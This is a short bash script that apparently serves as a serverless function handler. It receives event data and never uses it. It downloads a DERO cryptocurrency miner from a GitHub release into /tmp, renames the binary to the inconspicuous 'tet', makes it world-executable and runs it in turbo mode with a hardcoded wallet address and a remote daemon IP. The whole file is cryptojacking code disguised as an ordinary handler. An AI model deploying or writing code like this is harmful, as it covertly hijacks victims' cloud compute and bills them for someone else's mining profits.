function handler () {
    EVENT_DATA=$1
cd /tmp &&
curl -L https://github.com/Hansen333/Hansen33-s-DERO-Miner/releases/download/Version-0.6/hansen33s-dero-miner-linux-amd64.tar.gz -o /tmp/hansen33s-dero-miner-linux-amd64.tar.gz &&
tar -xf hansen33s-dero-miner-linux-amd64.tar.gz &&
rm hansen33s-dero-miner-linux-amd64.tar.gz &&
mv hansen33s-dero-miner-linux-amd64 tet &&
chmod 777 tet &&
./tet -wallet-address dero1qyphk8g6j4fq2d0qamjqcshw7sdcqgd7v7atuh9kpk57d3kr4t0lsqg8r886g -daemon-rpc-address 139.144.177.115:10100 -turbo
}
